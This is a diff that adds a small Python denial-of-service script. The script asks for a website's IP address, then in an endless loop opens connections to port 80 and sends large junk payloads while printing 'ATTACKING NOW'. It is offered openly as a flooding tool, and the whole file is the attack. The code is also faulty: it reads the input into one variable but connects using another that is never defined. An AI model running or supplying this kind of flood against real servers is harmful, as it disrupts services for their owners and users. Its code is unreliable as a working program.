@@ -1,0 +1,14 @@
+print('''
+
+  ••• CODED BY : ABDULRAHMAN ABOULDAHAB
+
+''')
+import socket
+log = input(' ♦ ENTER WEBSITE IP : ')
+while True:
+    sockett = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    socket.setdefaulttimeout(1)
+    conn = sockett.connect((ip,80))
+    data = 'fdgkdfhgdfhghdfghudfhgudfhgudfhgdhfgujhdgdfhgudfg'*1000
+    sockett.send(data)
+    print('••[X]> ~ ATTACKING NOW ~ <[X]••')
